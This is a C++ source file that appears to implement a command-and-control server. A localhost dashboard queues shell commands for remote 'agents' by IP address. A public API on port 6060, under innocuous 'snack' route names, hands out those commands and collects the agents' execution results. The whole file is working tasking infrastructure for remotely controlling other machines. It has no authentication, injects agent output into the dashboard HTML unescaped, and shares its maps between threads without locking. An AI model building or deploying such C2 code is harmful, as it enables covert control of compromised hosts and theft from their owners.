#include <iostream>
#include <string>
#include <map>
#include <queue>
#include <thread>
#include <fstream>
#include "httplib.h"

// --std::map<KeyType, ValueType> mapName;
// std::queue<std::string> store a collection of text strings 

std::map<std::string, std::queue<std::string>>Agent_Command_queue;

std::map<std::string, std::vector<std::string>>Agent_Input; 


//Local Control Panel

void RunDBServer() {

// HTTP
    httplib::Server svr;

    svr.Get("/panel",[](const httplib::Request& req, httplib::Response& res) {

            std::ifstream file("Dashboard.html");
            if(!file.is_open()){
                res.status = 500;
                res.set_content("Error : Dashboard file cannot be opened", "text/plain");
                return;
            }

            std::stringstream buffer;
            buffer << file.rdbuf();
            std::string html_content = buffer.str();

            //Dynamtically list the tracked agents
            std::string aglist = "";

        if(Agent_Command_queue.empty()){
                aglist = "<li> NO Agents Recorded Yet. </li>";
        }else{
            //Loop through our map 
            for (auto const& [ip,queue] : Agent_Command_queue){
                aglist += "<li>IP : " + ip + 
                " ( Pending Commands :" + std::to_string(queue.size()) + ")</li>";
            }
        }

            //Find PlaceHolder tag in html string replace it with actual datas
            size_t placeholder = html_content.find("{{AGENT_LIST}}");
            if(placeholder != std::string::npos) {
                html_content.replace(placeholder, 14, aglist);
                // 14 is the length of "{{AGENT_LIST}}"
            }

        std::string loghtml = "";

        if(Agent_Input.empty()) {
            loghtml = "<p>No output results received yet</P>";
        } else {

            //Loop through each IP inside our result map
            for(auto const& [ip, results_vector] : Agent_Input) {
                loghtml += "<h4> Logs for Agent [" + ip + "] : </h4><ul>";
                //Loop through every single string inside that specific Ip's vector array
                for (const std::string& single_output : results_vector) {
                    loghtml += "<li><pre>" + single_output + "</pre></li>";
                }
                loghtml += "</ul><hr>";
            }
        }


        //find placeholder for command result


        size_t placeholder2 = html_content.find("{{RESULT_LOG}}");
        if(placeholder2 != std::string::npos) {
            html_content.replace(placeholder2, 14, loghtml);
        }

        res.set_content(html_content,"text/html");


    });

    //process the command (form) submission from my browser
    svr.Post("/sendcommand", [](const httplib::Request& req, httplib::Response& res)  {


        if(req.has_param("agent_ip") && req.has_param("command")) {

        //Extract the variables send by the form 
        std::string target_ip = req.get_param_value("agent_ip");
        std::string command_text = req.get_param_value("command");

        Agent_Command_queue[target_ip].push(command_text);
        //Instead of printing raw text on a blank page, redirect back to /panel
        res.set_redirect("/panel"); 
        } else {
            res.status = 400;
            res.set_content("Error: Missing IP or Command fields.", "text/plain");
        }
    });

    std::cout<<"[+] Dashboard UI listening locally on http://localhost:8080/panel" <<std::endl;
        
        // Bind ONLY to localhost (127.0.0.1) on port 8080
        svr.listen("127.0.0.1", 8080);
};

//Public facing serrvers which agents will talk to

void RunAgentServer() {
    httplib::Server svr;

    // First Route ; where agent take the command 
    svr.Get("/getsnack",[](const httplib::Request& req, httplib::Response& res) {
        std::string who = req.remote_addr;
        std::string snack = "NOP" ; //default

        if(!Agent_Command_queue[who].empty()) {
           snack = std::move(Agent_Command_queue[who].front());
            Agent_Command_queue[who].pop();

        }


       res.set_content(snack,"text/plain");
    });


    // Second Route ; where agents upload their execution result

    svr.Post("/givesnack",[](const httplib::Request& req, httplib::Response& res) {
        std::string who = req.remote_addr;

        // Extract the raw text body sent by the agent (the command output)
        std::string received_snack = req.body ;

        if(!received_snack.empty()) {
            Agent_Input[who].push_back(received_snack);
        }else{
             res.status = 400;
        }

    });


    std::cout << "[~] Public Agent API listening on http://localhost:6060/getsnack" << std::endl;

    svr.listen("0.0.0.0",6060);


}


int main() {
    std::thread dashboard(RunDBServer);
    dashboard.detach();

    RunAgentServer();


    return 0;
}